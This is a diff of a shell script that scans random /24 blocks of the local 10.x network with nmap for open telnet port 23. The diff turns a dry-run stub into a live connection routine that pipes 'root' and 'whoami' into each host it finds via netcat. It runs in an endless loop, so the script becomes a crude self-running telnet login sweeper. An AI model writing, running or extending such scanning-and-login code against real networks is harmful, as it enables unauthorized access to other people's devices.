@@ -6,23 +6,35 @@
 
 MYSUBNET=`route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
 
-connect() {
-  echo would connect to $1
-  
+talk() {
+  sleep 2
+  echo root
+  sleep 2
+  echo whoami
+  sleep 5
+}
+
+connectTo() {
+  #echo would connect to $1:23 >2
+  talk | nc $1 23
 }
 
 sweep() {
-  N=$RANDOM
-  let "N %= 255"
-  echo looking for open port 23 in $MYSUBNET.$N.0/24
-  nmap -p 23 --open -oG hosts_$MYSUBNET.$N $MYSUBNET.$N.0/24
-  sed -En -i 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' hosts_$MYSUBNET.$N
-  for H in `cat hosts_$MYSUBNET.$N`
-  do connect $H
-  done
+  if [ -z "$1" ] ; then
+    N=$RANDOM
+    let "N %= 255"
+    SCAN=$MYSUBNET.$N.0/24
+  else
+    SCAN="$1"
+  fi
+  echo scanning $SCAN:23 >2
+  nmap -p 23 --open -oG hosts_$N $SCAN >/dev/null 2>&1
+  sed -En -i 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' hosts_$N
+  for H in `cat hosts_$N` ; do connectTo $H ; done
 }
 
-echo will scan subnet $MYSUBNET.0.0/16
+echo testing sweep with localhost
+sweep 127.0.0.1
 
-while true
-do sweep ; sleep 10 ; done
+echo scanning subnet $MYSUBNET.0.0/16 >2
+while true ; do sweep ; done
